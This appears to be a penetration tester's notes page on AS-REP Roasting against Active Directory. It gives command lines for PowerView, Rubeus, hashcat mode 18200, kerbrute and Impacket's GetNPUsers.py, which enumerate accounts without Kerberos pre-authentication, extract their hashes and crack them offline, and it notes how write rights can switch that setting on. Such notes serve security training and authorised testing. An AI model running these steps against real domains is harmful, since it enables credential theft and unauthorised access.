Obtain TGT for any account that has “Do not require Kerberos pre-authentication” set
- Targets AS-REP, not TGS-REP (Kerberoasting)
![image 376.png](../../assets/ASREPRoasting/image%20376.png)
  
if a user has GenericWrite or GenericAll, they can enable this attribute to the target account
  
# Enumerating for DONT_REQ_PREAUTH Value Using Get-DomainUser
```JavaScript
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
![image 1 280.png](../../assets/ASREPRoasting/image%201%20280.png)
  
# Retrieving AS-REP in Proper Format Using Rubeus
```JavaScript
.\Rubeus.exe asreproast /user:<target_user> /nowrap /format:hashcat
```
![image 2 238.png](../../assets/ASREPRoasting/image%202%20238.png)
  
# Cracking the Hash Offline with Hashcat
mode 18200
```JavaScript
hashcat -m 18200 <hash> /path/to/wordlist
```
![image 3 204.png](../../assets/ASREPRoasting/image%203%20204.png)
  
# Retrieving AS-REP Using Kerbrute
```JavaScript
kerbrute userenum -d <DOMAIN> --dc <IP> /opt/jsmith.txt 
```
![image 4 179.png](../../assets/ASREPRoasting/image%204%20179.png)
  
# Hunting for Users with Pre-Auth using Impacket
```JavaScript
GetNPUsers.py <DOMAIN>/ -dc-ip <IP> -no-pass -usersfile valid_ad_users
```
![image 5 167.png](../../assets/ASREPRoasting/image%205%20167.png)